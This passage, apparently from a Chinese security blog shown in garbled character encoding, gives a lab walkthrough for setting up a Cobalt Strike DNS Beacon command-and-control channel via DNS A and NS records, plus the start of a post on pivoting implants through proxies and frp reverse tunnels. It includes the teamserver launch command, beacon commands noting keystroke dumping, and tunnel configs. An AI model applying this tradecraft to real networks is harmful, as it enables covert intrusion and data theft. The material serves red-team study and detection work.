ns1.test.site =&gt; vpn.test.site **æ³¨å†Œç™»è®°æœºæ„ï¼ˆregistrarï¼‰**æ˜¯ä¸€ä¸ªå•†ä¸šå®ä½“ï¼Œå®ƒè´Ÿè´£éªŒè¯åŸŸåçš„å”¯ä¸€æ€§ï¼Œå°†åŸŸåè¾“å…¥DNSæ•°æ®åº“ã€‚ å½“ä½ å‘åŸŸåæ³¨å†Œå•†è´­ä¹°äº†ä¸€ä¸ªåŸŸåï¼Œé…ç½®äº†è¿™ä¸ªåŸŸåçš„Aè®°å½•å’ŒNSè®°å½•åï¼ŒåŸŸåæ³¨å†Œå•†ä¼šè´Ÿè´£å°†ä½ é…çš„è®°å½•æ’å…¥åˆ°DNSæ•°æ®åº“ä¸­ã€‚æœ‰å¯èƒ½å®ƒè‡ªå·±æ˜¯æ³¨å†Œç™»è®°æœºæ„(registrar)ï¼Œå°±èƒ½ç›´æ¥æ’å…¥ï¼Œä¹Ÿæœ‰å¯èƒ½å®ƒæ˜¯äº¤ç»™ç¬¬ä¸‰æ–¹DNSæ‰˜ç®¡å…¬å¸è´Ÿè´£ã€‚æ€»ä¹‹ï¼Œå½“ç”¨æˆ·å°è¯•è®¿é—®è¯¥åŸŸåæ—¶ï¼Œç”¨æˆ·çš„è¯·æ±‚å¯ä»¥è¢«è§£æåˆ°æ­£ç¡®çš„IPåœ°å€ï¼Œä»è€Œæ­£å¸¸è®¿é—®ç½‘ç«™ï¼Œå¯¹äºè°å°†è¿™ä¸ªåŸŸåçš„Aè®°å½•å’ŒNSè®°å½•å†™å…¥åˆ°å“ªä¸ªDNSæœåŠ¡å™¨ï¼Œæ˜¯æ— æ„Ÿçš„ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ ä¹°äº†åŸŸåï¼Œé…äº†è¿™ä¸ªåŸŸåçš„Aè®°å½•å’ŒNSè®°å½•ï¼Œç„¶åå°±å¯ä»¥è®¿é—®è¿™ä¸ªåŸŸåäº†ï¼Œè§£æä¸å‡ºæ¥çš„è¯å†å…·ä½“åˆ†ææ˜¯ä»€ä¹ˆæƒ…å†µï¼Œæœ‰å¯èƒ½ä¹°çš„ä¸å¤Ÿè´µï¼Œæ³¨å†Œå•†å†™å…¥çš„DNSæœåŠ¡å™¨æ¯”è¾ƒå°ä¼—æˆ–å†™çš„DNSæœåŠ¡å™¨æ¯”è¾ƒå°‘ã€‚ ç»†èŠ‚ï¼šåŸŸåè§£ææœ‰ä¸ªTTLå€¼æ®è¯´è¿™ä¸œè¥¿å…³ç³»åˆ°è§£æåŸŸåè¦ç­‰å¤šé•¿æ—¶é—´ï¼Œå›½å†…çš„å¾ˆå¤šå‚å•†è®¾ç½®çš„æœ€å°å€¼å¯ä»¥å†™60ï¼Œgodaddyæœ€å°å€¼ä¸º600ï¼Œå»ºè®®å…ˆæŠŠè¿™ä¸ªä¸œè¥¿å†™æˆå¹³å°å…è®¸çš„æœ€å°å€¼ï¼Œç­‰åˆ°æ£€éªŒOKäº†å†è°ƒå¤§ï¼Œä¸€èˆ¬è°ƒæˆ600~900å³å¯ã€‚ åœ¨åšå®¢çœ‹åˆ°å¯èƒ½å‡ºç°çš„é—®é¢˜ åœ¨ä½¿ç”¨DNS Beaconè¿›è¡Œæµ‹è¯•æ—¶å‘ç°åŸŸåæ²¡å¤‡æ¡ˆæ²¡åŠæ³•è§£æåˆ°vpsçš„IPä¸Š,å¦‚æœè¦é€šè¿‡è¿™ç§æ–¹å¼,æœ€å¥½ä½¿ç”¨å¤‡æ¡ˆçš„åŸŸåæˆ–è€…ä¸éœ€å¤‡æ¡ˆçš„åŸŸåç­‰æ–¹å¼ è™šæ‹Ÿæœºæ–¹æ¡ˆ å¦‚æœä¸ä¹°vpså’ŒåŸŸåï¼Œä¹Ÿèƒ½åšè¿™ä¸ªå®éªŒã€‚ç»™é¶æœºè®¾ä¸€ä¸ªDNSæœåŠ¡å™¨ï¼ˆç›¸å½“äºvps+åŸŸåæ–¹æ¡ˆä¸­ï¼Œé¶æœºå¤©ç„¶é€šè¿‡DNSæœåŠ¡å™¨è§£æåˆ°åŸŸåï¼‰ï¼Œè¿™ä¸ªDNSæœåŠ¡å™¨ä¸Šæœ‰Aè®°å½•å’ŒNSè®°å½•ã€‚å› ä¸ºæˆ‘åœ¨windows serverå®‰è£…äº†DNSåŠŸèƒ½åï¼Œæ²¡æ‰¾åˆ°NSè®°å½•åœ¨å“ªé‡Œè®¾ç½®ï¼Œäºæ˜¯åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªè½¯ä»¶Simple DNS Plusï¼Œå®‰è£…è¿™ä¸ªè½¯ä»¶åå¯ä»¥é…Aè®°å½•å’ŒNSè®°å½•ï¼Œé‚£ä¹ˆå°±ç”±å®‰è£…äº†è¿™ä¸ªè½¯ä»¶çš„é‚£å°è™šæ‹Ÿæœºå……å½“DNSæœåŠ¡å™¨ã€‚ è™šæ‹Ÿæœºæ¸…å• è™šæ‹Ÿæœºåç§° ip åŸŸå å¤‡æ³¨ kali-linux-2023.3_client2 192.168.242.130 c2.test.com teamserverå’Œæ”»å‡»æœº è¢«æ§ç«¯A_Windows Server 2019 EN 192.168.242.131 é¶æœº DNS_Windows Server 2016 EN 192.168.242.140 å®‰è£…äº†Simple DNS Plusè½¯ä»¶ï¼Œå……å½“DNSæœåŠ¡å™¨ è½¯ä»¶æ¸…å• è½¯ä»¶åç§° ä½œç”¨ cs4.5 Simple DNS Plus åœ¨ä¸€å°è™šæ‹Ÿæœºä¸Šå®‰è£…è¯¥è½¯ä»¶ï¼Œåˆ›å»ºAè®°å½•å’ŒNSè®°å½• å®‰è£…Simple DNS Plus é€‰ä¸€ä¸ªç¬¦åˆå®‰è£…è¦æ±‚çš„ç³»ç»Ÿå®‰è£…è¯¥è½¯ä»¶ã€‚Simple DNS Pluså®‰è£…æ—¶ä¼šè”ç½‘ä¸‹è½½å®‰è£….NET Framework 4.8ã€‚å¦‚æœéœ€è¦ç¦»çº¿å®‰è£…ï¼Œå…ˆç”¨.NET 4.8çš„ç¦»çº¿å®‰è£…åŒ…å®‰è£… .NET 4.8ï¼Œç„¶åå†å®‰è£…Simple DNS Plusã€‚ æ‰“å¼€è½¯ä»¶åï¼Œå¯ä»¥çœ‹åˆ°æœ¬åœ°åœ°å€ä¸€åˆ—ï¼Œudp53ç«¯å£åœ¨è¢«ä½¿ç”¨ File -&gt; Edit DNS Records...æˆ–ç‚¹Recordså›¾æ ‡ä¿®æ”¹DNSè®°å½• æ­£å‘åŒºåŸŸ Finishåï¼Œåˆ›å»ºAè®°å½•å’ŒNSè®°å½• è®°å¾—ç‚¹ä¿å­˜ ä¸€æ¡Aè®°å½•æŒ‡å‘CSçš„IPåœ°å€ï¼Œc2.test.com =&gt; teamserverçš„IPåœ°å€192.168.242.130 3æ¡NSè®°å½•æŒ‡å‘åˆšåˆšAè®°å½•å¯¹åº”çš„åŸŸå ns1.test.com =&gt; c2.test.com ns2.test.com =&gt; c2.test.com ns3.test.com =&gt; c2.test.com Configuracion de servidor DNS en windows con Simple DNS å…³é—­é˜²ç«å¢™ åœ¨é¶æœºä¸Šé…ç½®192.168.242.140ä¸ºDNSæœåŠ¡å™¨ï¼Œç”¨nslookupå‘½ä»¤æ£€éªŒDNSè§£ææ˜¯å¦æ­£å¸¸ å¯åŠ¨csåŠé¶æœºä¸Šçº¿ ç”¨çš„4.5ç‰ˆæœ¬çš„csï¼Œæœªå¸¦profileå¯åŠ¨teamserver 1./teamserver 192.168.242.130 password å®¢æˆ·ç«¯è¿æ¥teamserverï¼Œé…ç½®DNS Beacon å…³äºDNS Hostï¼ˆStagerï¼‰å¤„å¡«Aè®°å½•çš„é—®é¢˜åœ¨ç½‘ä¸Šçœ‹åˆ°æŒºå¤šçš„æ–‡ç« ï¼Œè¿™é‡Œå†™çš„æ˜¯Aè®°å½•ã€‚åœ¨cs4.0ç‰ˆæœ¬çš„æ–‡æ¡£ä¸­çš„é…å›¾ï¼Œè¿™ä¸ªå­—æ®µå’ŒDNS Hostså¡«çš„éƒ½æ˜¯NSè®°å½•ã€‚æœ¬æ–‡æœ€ä¸Šé¢å¼•ç”¨æ–‡æ¡£ï¼ˆ4.7 | 202211210414 | November 2022ï¼‰ä¸­å¯¹äºDNS Beaconè¿™ä¸ªå‚æ•°çš„è§£é‡Šè¯´çš„ä¹Ÿæ˜¯NSè®°å½•ã€‚DNS Host (Stager) - This configures the DNS Beaconâ€™s TXT record stager. This stager is only used with Cobalt Strike features that require an explicit stager. Your Cobalt Strike team server system must be authoritative for this domain as well.å¦‚æœæˆ‘ä»¬ç†è§£äº†beaconä¸Šçº¿æ—¶è§£æåŸŸåçš„è¿‡ç¨‹ï¼Œé€šä¿¡æµé‡å°è£…åœ¨DNSè¯·æ±‚ä¸­ï¼Œç”±DNSæœåŠ¡å™¨è½¬å‘ï¼Œé€šè¿‡NSè®°å½•ï¼Œæœ€ç»ˆè¿˜æ˜¯ä¼šæ‰¾åˆ°teamserverã€‚åªè¦æˆ‘ä»¬é…å¥½äº†ï¼š1æ¡Aè®°å½•æŒ‡å‘teamserverçš„IPï¼Œä¸€æ¡æˆ–å¤šæ¡NSè®°å½•æŒ‡å‘Aè®°å½•ã€‚ å¦‚æœ53ç«¯å£æœ‰å†²çªï¼Œå…³æ‰å ç”¨53ç«¯å£çš„å…¶ä»–è¿›ç¨‹ é€‰çš„Stagelessã€‚å¦‚æœé€‰stagerçš„è¯ï¼Œè¢«æ§æœºå™¨è¦ä»CSæœåŠ¡å™¨ä¸‹è½½å®Œstageçš„æ•°æ®æ‰ä¼šä¸Šçº¿é€šä¿¡ï¼Œå› ä¸ºdnsåè®®æ¯æ¬¡ä¼ è¾“çš„æ•°æ®é‡å¾ˆå°ï¼Œè¦ç­‰å¾ˆé•¿æ—¶é—´æ‰ä¸Šçº¿ã€‚ å°†ç”Ÿæˆçš„beaconæŠ•é€åˆ°é¶æœºæ‰§è¡Œ æ­¤æ—¶ï¼Œå›¾æ ‡æ˜¯ä¸ªé»‘æ¡†ã€‚DNS Beaconåªæœ‰åœ¨æœ‰å¯ç”¨ä»»åŠ¡æ—¶æ‰ä¼šcheckinã€‚ä½¿ç”¨checkinå‘½ä»¤æ¥è¯·æ±‚DNS Beaconåœ¨ä¸‹æ¬¡å›è¿çš„æ—¶å€™check inã€‚ å…¶å®ä¸æ‰§è¡Œ checkin ä¹Ÿå¯ä»¥ã€‚å¦‚æœæ‰§è¡Œä¸€ä¸ªå…¶ä»–å‘½ä»¤ï¼Œæ¯”å¦‚whoamiï¼Œå®ƒé¦–å…ˆä¼šè‡ªåŠ¨check inï¼Œå†æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚å¦‚æœåªè¾“å…¥checkinå‘½ä»¤ï¼Œå°±åªè¿”å›æ¥å…ƒæ•°æ® 12345beacon&gt; help checkinUse: checkinForces DNS Beacon to connect to you. During a checkin Beacon posts its hostmetadata and dumps logged keystrokes. ä½¿ç”¨modeå‘½ä»¤æ¥æ”¹å˜å½“å‰Beaconçš„æ•°æ®é€šé“ã€‚DNS Beaconå¯ä»¥é€šè¿‡DNS TXTè®°å½•ã€DNS AAAAè®°å½•æˆ–DNS Aè®°å½•ä¸‹è½½ä»»åŠ¡ã€‚ mode dnsæ˜¯DNS Aè®°å½•æ•°æ®é€šé“ï¼› mode dns6æ˜¯DNS AAAAè®°å½•æ•°æ®é€šé“ï¼› mode dns-txtæ˜¯DNS TXTè®°å½•æ•°æ®é€šé“ã€‚DNS TXTè®°å½•æ˜¯é»˜è®¤çš„æ•°æ®é€šé“ã€‚ 1234567891011121314151617181920212223beacon&gt; help modeUse: mode [dns|dns6|dns-txt]Sets Beacon&#x27;s mode to exchange data with the end-user. This only has an effecton a DNS beacon.mode dns--------Get tasks with DNS A record requests. Use this option to communicate with DNS when TXT records are not an option. Sends data as DNS requests with data encodedinside of the hostname.mode dns6---------Get tasks with DNS AAAA record requests. Use this option to communicate with DNS when TXT records are not an option. Sends data as DNS requests with data encodedinside of the hostname.mode dns-txt------------Get tasks with DNS TXT record requests. This channel carries 189 bytes per request versus 4 bytes for a DNS A record request. Sends data with the sametechnique as the other DNS mode. Beaconå·¥ä½œè¿‡ç¨‹ çŸ¥è¯†å›é¡¾ DNSæ•°æ®åº“ä¸­çš„è®°å½•ï¼š Aè®°å½•ï¼šä¸»æœºååˆ°IPåœ°å€çš„æ˜ å°„ NSè®°å½•ï¼šåŸŸåè§£ææœåŠ¡å™¨è®°å½•ï¼Œå°†ä¸€ä¸ªå­åŸŸåæŒ‡å®šæŸä¸ªåŸŸåæœåŠ¡å™¨è§£æ TXTè®°å½•ï¼šä»»æ„å¡«å†™ï¼Œå¯ä¸ºç©ºï¼Œä¸€èˆ¬åšä¸€äº›éªŒè¯è®°å½•æ—¶ä¼šä½¿ç”¨ å¤§è‡´æ¥è¯´ï¼Œæœ‰ä¸‰ç§ç±»å‹çš„DNSæœåŠ¡å™¨ï¼šæ ¹DNSæœåŠ¡å™¨ã€é¡¶çº§åŸŸï¼ˆTop-Level Domain,TLDï¼‰DNSæœåŠ¡å™¨å’Œæƒå¨DNSæœåŠ¡å™¨ã€‚ä¸ºäº†ç†è§£è¿™3ç§ç±»å‹çš„ DNS æœåŠ¡å™¨äº¤äº’çš„æ–¹å¼ï¼Œå‡å®šä¸€ä¸ªDNSå®¢æˆ·è¦å†³å®šä¸»æœºå www.amazon.com çš„IPåœ°å€ã€‚ç²—ç•¥è¯´æ¥ï¼Œå°†å‘ç”Ÿä¸‹åˆ—äº‹ä»¶ã€‚å®¢æˆ·é¦–å…ˆä¸æ ¹æœåŠ¡å™¨ä¹‹ä¸€è”ç³»ï¼Œå®ƒå°†è¿”å›é¡¶çº§åŸŸåcom çš„TLDæœåŠ¡å™¨çš„IPåœ°å€ã€‚è¯¥å®¢æˆ·åˆ™ä¸è¿™äº›TLDæœåŠ¡å™¨ä¹‹ä¸€è”ç³»ï¼Œå®ƒå°†ä¸ºamazon. comè¿”å›æƒå¨æœåŠ¡å™¨çš„IPåœ°å€ã€‚æœ€åï¼Œè¯¥å®¢æˆ·ä¸amazon. comæƒå¨æœåŠ¡å™¨ä¹‹ä¸€è”ç³»ï¼Œå®ƒä¸ºä¸»æœºå www.amazon.com è¿”å›å…¶IPåœ°å€ã€‚ ç›®æ ‡ä¸»æœºè¦å¯¹åŸŸå1234.profiles.losenolove.comè¿›è¡Œè§£æ, é¦–å…ˆæŸ¥æœ¬åœ°ç¼“å­˜ï¼Œå¦‚æœæ²¡æœ‰ã€‚å°±æŸ¥æœ¬åœ°çš„hostsæ–‡ä»¶, è‹¥æ²¡æœ‰ï¼Œåˆ™å‘æœ¬åœ°DNSæœåŠ¡å™¨å‘é€ä¸€ä¸ªDNSæŸ¥è¯¢æŠ¥æ–‡ã€‚ æœ¬åœ°DNSæœåŠ¡å™¨é¦–å…ˆæŸ¥è¯¢è‡ªå·±çš„æœ¬åœ°ç¼“å­˜, å¦‚æœæœ‰ï¼Œç›´æ¥ä½¿ç”¨è¿™ä¸ªIPåœ°å€ä¸teamserverè¿›è¡Œé€šä¿¡ã€‚å¦‚æœæ²¡æœ‰ï¼Œåˆ™è¿›è¡Œè¿­ä»£æŸ¥è¯¢ã€‚å°†æ­¥éª¤1çš„æŸ¥è¯¢æŠ¥æ–‡è½¬å‘åˆ°æ ¹åŸŸåæœåŠ¡å™¨å‘èµ·è¯¢é—®, æ ¹åŸŸåæœåŠ¡å™¨æ³¨æ„åˆ°å…¶.comå‰ç¼€ï¼Œå‘æœ¬åœ°DNSæœåŠ¡å™¨è¿”å›è´Ÿè´£.comçš„TLDçš„IPåœ°å€åˆ—è¡¨ã€‚ æœ¬åœ°DNSæœåŠ¡å™¨åˆ™å†æ¬¡å‘è¿™äº›TLDæœåŠ¡å™¨ä¹‹ä¸€å‘é€æŸ¥è¯¢æŠ¥æ–‡ã€‚.comçš„TLDæ³¨æ„åˆ°å…¶losenolove.comå‰ç¼€ï¼Œå‘æœ¬åœ°DNSæœåŠ¡å™¨è¿”å›è´Ÿè´£losenolove.comçš„ä¸­é—´DNSçš„IPåœ°å€åˆ—è¡¨ã€‚ æœ¬åœ°DNSæœåŠ¡å™¨åˆ™å†æ¬¡å‘è¿™äº›ä¸­é—´DNSæœåŠ¡å™¨ä¹‹ä¸€å‘é€æŸ¥è¯¢æŠ¥æ–‡ã€‚losenolove.comè¿™ä¸ªä¸­é—´DNSæœåŠ¡å™¨æ³¨æ„åˆ°å…¶profiles.losenolove.comå‰ç¼€ï¼Œå®ƒæŸ¥æ‰¾ä¸profiles.losenolove.comå…³è”çš„NSè®°å½•ï¼Œç„¶åå‘æœ¬åœ°DNSæœåŠ¡å™¨è¿”å›æƒå¨DNSæœåŠ¡å™¨malwarec2.losenolove.comçš„IPåœ°å€ã€‚ æœ€ç»ˆï¼Œæœ¬åœ°DNSæœåŠ¡å™¨è®¿é—®äº†malwarec2.losenolove.comæœåŠ¡å™¨ã€‚ æ­£å¸¸è¿‡ç¨‹ï¼šæŸ¥è¯¢åˆ°äº†1234.profiles.losenolove.comçš„å“åº”å€¼, éšåmalwarec2.losenolove.comæœåŠ¡å™¨å°†å“åº”å€¼è¿”å›ç»™æœ¬åœ°DNSæœåŠ¡å™¨, æœ¬åœ°DNSæœåŠ¡å™¨å†è¿”å›ç»™ç›®æ ‡ä¸»æœºã€‚ csé€šä¿¡è¿‡ç¨‹ï¼šDNSçš„å“åº”æŠ¥æ–‡ä¸­çš„å†…å®¹ï¼Œæ˜¯teamserverä¸é¶æœºé€šä¿¡çš„å†…å®¹ã€‚ ä¹‹å‰çœ‹ã€Šè®¡ç½‘ã€‹çš„ç¤ºä¾‹éƒ½æ˜¯Aè®°å½•ï¼Œè¿™é‡Œè¦å¤„ç†NSè®°å½•ï¼Œæ€è€ƒæœ‰ç‚¹è½¬ä¸è¿‡æ¥ï¼š NSè®°å½•æ˜¯åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰ä¸­çš„ä¸€ç§ç±»å‹ï¼Œå®ƒæŒ‡å®šäº†è´Ÿè´£ç‰¹å®šåŸŸåçš„åç§°æœåŠ¡å™¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œprofiles.losenolove.comæ˜¯ä¸€ä¸ªNSè®°å½•ï¼ŒæŒ‡å‘è´Ÿè´£å¤„ç†è¯¥å­åŸŸåæŸ¥è¯¢çš„æœåŠ¡å™¨ã€‚ å½“DNSæŸ¥è¯¢æŠ¥æ–‡åˆ°è¾¾losenolove.comæœåŠ¡å™¨åï¼Œå®ƒä¼šæŸ¥çœ‹æŸ¥è¯¢çš„æ˜¯å“ªä¸ªå­åŸŸåã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒçœ‹åˆ°æŸ¥è¯¢çš„æ˜¯profiles.losenolove.comï¼Œæ‰€ä»¥å®ƒä¼šæŸ¥æ‰¾ä¸profiles.losenolove.comå…³è”çš„NSè®°å½•ã€‚ç„¶åï¼Œå®ƒä¼šå°†æŸ¥è¯¢æŠ¥æ–‡è½¬å‘åˆ°NSè®°å½•æŒ‡å®šçš„æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯malwarec2.losenolove.comã€‚ å®éªŒä¸­Beaconå·¥ä½œè¿‡ç¨‹åˆ†æ æ¦‚æ‹¬ç‚¹æ¥è¯´ï¼Œæˆ‘ä»¬ç”³è¯·äº†NSè®°å½•ï¼ŒAè®°å½•ã€‚NSè®°å½•æŒ‡å‘äº†Aè®°å½•ï¼ŒAè®°å½•æŒ‡å‡ºäº†ipåœ°å€ã€‚é¶æœºçš„Beaconè®¿é—®å­åŸŸåï¼Œè¿›å…¥é€’å½’æŸ¥è¯¢åï¼ŒæŸ¥åˆ°è¿™äº›å­åŸŸåç”±ä¸€ä¸ªæƒå¨æœåŠ¡å™¨è´Ÿè´£è§£æï¼Œé€šè¿‡Aè®°å½•ä¸­çš„ipå»æ‰¾è¿™ä¸ªæƒå¨æœåŠ¡å™¨ã€‚ è¿™æ•´ä¸ªè¿‡ç¨‹ï¼Œå°±æ˜¯é¶æœº-&gt;Teamserverä¹‹é—´çš„é€šä¿¡ã€‚ ä¸€æ¡Aè®°å½•æŒ‡å‘CSçš„IPåœ°å€ï¼Œc2.test.com =&gt; teamserverçš„IPåœ°å€192.168.242.130 3æ¡NSè®°å½•æŒ‡å‘åˆšåˆšAè®°å½•å¯¹åº”çš„åŸŸå ns1.test.com =&gt; c2.test.com ns2.test.com =&gt; c2.test.com ns3.test.com =&gt; c2.test.com é¦–å…ˆï¼Œè®¡ç®—æœºä¼šæ£€æŸ¥å®ƒçš„æœ¬åœ°DNSç¼“å­˜ï¼Œçœ‹æ˜¯å¦æœ‰ns1.test.comçš„IPåœ°å€ã€‚å¦‚æœæœ‰ï¼Œå®ƒå°†ç›´æ¥ä½¿ç”¨è¿™ä¸ªIPåœ°å€ã€‚å¦‚æœæ²¡æœ‰ï¼Œå®ƒå°†å‘é…ç½®çš„DNSæœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚ åœ¨ä¸Šè¿°å®éªŒçš„é…ç½®ä¸­ï¼Œæˆ‘çš„è™šæ‹ŸæœºAå·²ç»è®¾ç½®äº†DNSæœåŠ¡å™¨ã€‚æ‰€ä»¥ï¼Œè™šæ‹ŸæœºAä¼šå‘DNSæœåŠ¡å™¨å‘é€ä¸€ä¸ªæŸ¥è¯¢è¯·æ±‚ï¼Œè¯¢é—®ns1.test.comçš„IPåœ°å€ã€‚ DNSæœåŠ¡å™¨æ¥æ”¶åˆ°æŸ¥è¯¢è¯·æ±‚åï¼Œä¼šæŸ¥çœ‹å®ƒçš„DNSè®°å½•ã€‚åœ¨æˆ‘çš„è®¾ç½®ä¸­ï¼Œns1.test.comæ˜¯ä¸€ä¸ªNSè®°å½•ï¼Œå®ƒæŒ‡å‘c2.test.comã€‚ç„¶åï¼Œè™šæ‹ŸæœºAä¼šæŸ¥æ‰¾c2.test.comçš„Aè®°å½•ï¼Œæ‰¾åˆ°å¯¹åº”çš„IPåœ°å€192.168.242.130ã€‚ DNSæœåŠ¡å™¨å°†è¿™ä¸ªIPåœ°å€è¿”å›ç»™è™šæ‹ŸæœºAï¼Œè™šæ‹ŸæœºAå°±çŸ¥é“äº†ns1.test.comçš„IPåœ°å€ï¼Œå¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥çš„ç½‘ç»œé€šä¿¡ã€‚ å› ä¸ºæˆ‘ä»¬åœ¨csä¸Šå¼€äº†dnsç›‘å¬å™¨ï¼Œcsæ¥æ”¶åˆ°DNSæŸ¥è¯¢æŠ¥æ–‡åï¼Œè¿”å›å“åº”æŠ¥æ–‡ã€‚ é¶æœºï¼Œå°±åœ¨è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œå’Œcså¼€å§‹é€šä¿¡äº†ã€‚DNS å“åº”å‘Šè¯‰Beaconä¼‘çœ æˆ–æ˜¯è¿æ¥åˆ°å›¢é˜ŸæœåŠ¡å™¨æ¥ä¸‹è½½ä»»åŠ¡ã€‚DNSå“åº”ä¹Ÿå‘Šè¯‰Beaconå¦‚ä½•ä»å›¢é˜ŸæœåŠ¡å™¨ä¸‹è½½ä»»åŠ¡ã€‚ å‚è€ƒ é“¾æ¥ å¤‡æ³¨ å†…ç½‘æ¸—é€ç¥å™¨CobaltStrikeä¹‹DNS Beacon(å››) _ DNS Beaconä½¿ç”¨æ¼”ç¤º ã€ŠA-TEAM å›¢é˜Ÿçš„ CS 4.0 ç”¨æˆ·æ‰‹å†Œã€‹ æ±‰åŒ–ä½¿ç”¨æ‰‹å†Œ DNS Beacon (Cobalt Strike 4.0) cs4.0 DNS Beaconæ¼”ç¤ºè§†é¢‘ CSä¸Šçº¿ä¹‹DNSéš§é“è¸©å‘è®° ä¸€äº›ç»†èŠ‚ COBALTSTRIKE DNS BEACON LAB SETUP è™šæ‹Ÿæœºæ–¹æ¡ˆçš„å‚è€ƒæ–‡ç« ï¼Œä½†æ˜¯é…äº†Aè®°å½• cobaltstrike dns beaconçŸ¥å¤šå°‘ åŸç† è¸©å‘è®°å½•-DNS Beacon DNS Beaconä¸Šçº¿åæŠ¥æ–‡åˆ†æ åˆæ¢Cobalt Strikeâ€“Beacon(ä¸€) æºç åˆ†æ","tags":["Cobalt Strike"],"categories":["å®‰å…¨æŠ€æœ¯","æ¸—é€å·¥å…·"]},{"title":"ä»£ç†ç©¿é€ä¸åå‘ä»£ç†","path":"/posts/8eabe7df.html","content":"ç½‘ç»œæ‹“æ‰‘ç¯å¢ƒå›¾ ç½‘ç»œæ‹“æ‰‘å›¾å¦‚ä¸‹ï¼šå†…ç½‘ä¸»æœºAï¼Œå†…ç½‘ä¸»æœºBï¼›æ”»å‡»è€…ä¸»æœºC Aä¸èƒ½ä¸Šå¤–ç½‘ï¼ŒBèƒ½ä¸Šå¤–ç½‘ Aä¸Bäº’è¿ï¼ŒBä¸Cäº’è¿ï¼ŒCè®¿é—®ä¸åˆ°A ä»£ç†ç©¿é€ ç¯å¢ƒæè¿°ï¼š è™šæ‹ŸæœºBé€šè¿‡æŸäº›è½¯ä»¶ä½¿å…¶æˆä¸ºä»£ç†æœåŠ¡å™¨ï¼Œç›‘å¬ç«¯å£å‡è®¾ä¸º7777ï¼Œç›‘å¬æ¥è‡ªç«¯å£çš„è¯·æ±‚ã€‚Aè®¾ç½®ä»£ç†æœåŠ¡å™¨çš„ipåœ°å€å’Œç«¯å£7777ï¼Œä¾¿èƒ½ä¸Šå¤–ç½‘ ä¸Šçº¿æè¿°ï¼š ç›®æ ‡ç«¯ç¨‹åºé…ç½®åè¿åœ°å€ä¸ºæ”»å‡»è€…ä¸»æœºCï¼Œ192.168.147.147ï¼Œç«¯å£6666 åœ¨è™šæ‹ŸæœºAä¸Šè¿è¡Œï¼Œç›®æ ‡ç«¯ç¨‹åºèƒ½è‡ªåŠ¨è¯»å–Aä¸Šçš„ä»£ç†é…ç½®ï¼Œé€šè¿‡ä»£ç†æœåŠ¡å™¨Båè¿åˆ°æ”»å‡»è€…ä¸»æœºä¸Šã€‚ ä¸Šçº¿åˆ—è¡¨ä¸­çš„ipåœ°å€ä¸ºä»£ç†æœåŠ¡å™¨Bçš„ipåœ°å€ã€‚ æ ·ä¾‹ è™šæ‹ŸæœºBä¸ºWindows Server 2008ï¼Œåœ¨å…¶ä¸Šé¢æ­å»ºTMGä»£ç†æœåŠ¡å™¨ï¼Œç«¯å£8080ã€‚ è™šæ‹ŸæœºAåœ¨ç³»ç»Ÿä»£ç†ä¸­è®¾ç½®ä»£ç†ä¸º192.168.242.220:8080ï¼Œä¾¿èƒ½ä¸Šå¤–ç½‘ã€‚ ç›®æ ‡ç«¯ç¨‹åºåè¿åœ°å€ä¸ç«¯å£é…ç½®ä¸ºï¼š192.168.147.147:6666ï¼Œæ”»å‡»è€…ä¸»æœºCå¼€å¯ç›‘å¬ç«¯å£6666ã€‚ ç›®æ ‡ç«¯ç¨‹åºåœ¨ä¸»æœºAä¸Šè¿è¡Œï¼Œè¿›è¡Œä»£ç†ç©¿é€ï¼Œå®ç°ä¸Šçº¿ã€‚ åå‘ä»£ç† ç¯å¢ƒæè¿°ï¼š æ”»å‡»è€…ä¸»æœºCä¸é¶æœºBä¹‹é—´å·²æ„å»ºåå‘ä»£ç†é€šé“ï¼Œæ”»å‡»è€…ä¸»æœºä¸ºclientï¼Œè™šæ‹ŸæœºBä¸ºserverã€‚ ä¸Šçº¿æè¿°ï¼š ç›®æ ‡ç«¯ç¨‹åºé…ç½®åè¿åœ°å€ä¸ºè™šæ‹ŸæœºBï¼Œ192.168.242.220ï¼Œç«¯å£ä¸ºåå‘ä»£ç†serverè®¿é—®ç«¯å£6000 æ”»å‡»è€…ä¸»æœºCç›‘å¬ç«¯å£ä¸åå‘ä»£ç†clientç«¯å£ç›¸åŒï¼Œä¸º6666. åœ¨è™šæ‹ŸæœºAä¸Šè¿è¡Œï¼Œç›®æ ‡ç«¯ç¨‹åºåè¿è™šæ‹ŸæœºB:6000ï¼Œè™šæ‹ŸæœºBå†å°†å…¶é€åˆ°åå‘ä»£ç†å®¢æˆ·ç«¯6666ï¼Œå®ç°ä¸Šçº¿ ä¸Šçº¿åˆ—è¡¨ä¸­çš„ipåœ°å€ä¸ºé¶æœºä¸»æœºAçš„ipåœ°å€ã€‚ æ ·ä¾‹ ä»¥åå‘ä»£ç†å·¥å…·frpä¸ºä¾‹ï¼Œåœ¨Bä¸Cä¹‹é—´æ„å»ºåå‘ä»£ç†ã€‚ frpcåœ¨æ”»å‡»è€…ä¸»æœºCä¸Šè¿è¡Œï¼Œfrpsåœ¨è™šæ‹ŸæœºBä¸Šè¿è¡Œã€‚ frpc.inié…ç½®æ–‡ä»¶å†…å®¹ä¸ºï¼š 123456789[common]server_addr = 192.168.147,133\t#æœåŠ¡ç«¯ipåœ°å€server_port = 7000 #æœåŠ¡ç«¯ç«¯å£[test]type = tcp #è½¬å‘çš„åè®®ç±»å‹local_ip = 127.0.0.1 #å®¢æˆ·ç«¯ipåœ°å€local_port = 6666 #å®¢æˆ·ç«¯ç«¯å£remote_port = 6000 #æœåŠ¡ç«¯è¿œç¨‹è®¿é—®ç«¯å£ 1frpc.exe -c frpc.ini frps.inié…ç½®æ–‡ä»¶å†…å®¹ä¸ºï¼š 12[common]bind_port = 7000 1frps.exe -c frps.ini ç›®æ ‡ç«¯ç¨‹åºåè¿åœ°å€ä¸ç«¯å£é…ç½®ä¸ºï¼š192.168.242.220:6000ï¼Œæ”»å‡»è€…ä¸»æœºCå¼€å¯ç›‘å¬ç«¯å£6666ã€‚ ç›®æ 